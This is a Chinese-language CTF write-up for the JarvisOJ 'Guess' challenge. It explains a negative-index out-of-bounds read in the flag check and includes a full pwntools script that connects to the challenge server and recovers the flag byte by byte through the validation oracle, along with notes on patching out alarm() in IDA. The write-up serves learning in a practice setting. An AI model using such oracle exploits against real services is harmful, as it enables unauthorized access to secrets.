---
title: javisOj->Guess
categories:
-  jarvisOj
---

# jarvis->guess

## 前言

周末摸鱼，看做出来的人数以为好做，结果GG，感觉这个题有点像以前看过的一道crypto，总结一下好了

## 程序逻辑

下载下来的文件是用来本地测试的，开了socket，监听9999端口，其实就是模拟服务器跑的程序，所以本地通信建一个socket就好。重点是is_flag_correct()函数，是一个验证用户输入的函数，所以这个看起来更像一个逆向题。

调用这个函数前有一个fgets(inbuf,0x1000,stdin)，如果长度这么长，那么在flag_hexa = flag_hex的时候构造一个100*'A'+'\x00'即可绕过长度检查，造成溢出，不过这个测试之后发现好像没什么用，fuzz没什么异常，继续看函数，里面check flag是通过跟一个预存在栈上的flag数组对比确定的，但是是通过bin_by_hex这个数组做了一次映射确定，而这个数组初始化又是由0x401100LL地址上的数据完成的，有趣的是这个数组的0x30处正是0，其ascii码也是0x30，同理A-F的ascii码对应其数组的索引。因此这个比较只需要用户按顺序输入flag即可，这个比较当然不如直接让用户输入和flag对比来的快，所以这里面一定有什么设计。

![code](1.jpg)
![code2](2.jpg)
![bin_by_hex](3.jpg)

## 程序漏洞
漏洞就出现在数组索引的检查，数组其实就是一个字符串指针，array[i]等同于*(array+i)，所以当i为负数时，其得到的数据是字符串指针低地址处的数据，这里的flag位置是ebp-0x150，bin_hex_index的位置在ebp-0x110，因此bin_hex_index[-0x40]即flag[0]，想要验证成功，只需value1 = 0,value2 = flag[i]。flag[i] = bin_hex_index[-0x40+i]，即用户输入chr(-0x40+i)，但是注意chr()范围是0-256，因此-0x40+i需要+0x100(模100类似格式化字符串以前的知识)，最终构造出一个完美验证通过的payload。
仅仅通过验证不是目的，我们还得知道真正的flag是什么，这里因为我们已经通过payload通过了验证，那么现在只需要修改Payload的第一、二字节，使其为ascii(20-127)，重复验证，一旦得到通过即可确定第一个字节，后面的也同理，两个字节两个字节的确定，直到所有payload都被替换成真正的flag

## exp.py

```python
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="error")
sh = remote('pwn.jarvisoj.com',9878)
def guess(data):
    sh.recvuntil('guess> ')
    sh.sendline(data)
    response = sh.recvline().strip('\n')
    if response == 'Nope.':
        return 1
    else:
        return 0
init_payload = ''
offset = 0x100-0x40
for i in range(100):
    if i % 2 == 0:
        init_payload += '0'
    else:
        init_payload += chr(offset + (i-1)/2)
print len(init_payload)
#init_payload = "504354467b3439643433313061313038353837353536373933323635316535353965313533636663386264323762340" + init_payload[95:]
while True:
    for i in range(0,100,2):
        for j in range(20,128):
            temp = hex(j)[2:]
            init_payload = init_payload[:i] + temp.ljust(2,'0') + init_payload[i+2:]
            if guess(init_payload) == 0:
                break
        print str(i)+':'+init_payload
    break
print init_payload
flag = init_payload.decode('hex')
print flag
```

中间recv会报timeout，可以修改for循环start，断点验证，之后hex_encode即可

## 编外
看别人的wp有说patch改掉alarm然后方便调试的，这里也记录一下吧，虽然自己没调试

找到call _alarm位置，option->general,number of opcode bytes改为8
选中mov edi,78h call _alarm,打开Edit->Patch Program->change bytes
最后Edit->Patch Program->Apply patches to input file

![patch](5.jpg)
![res](6.jpg)

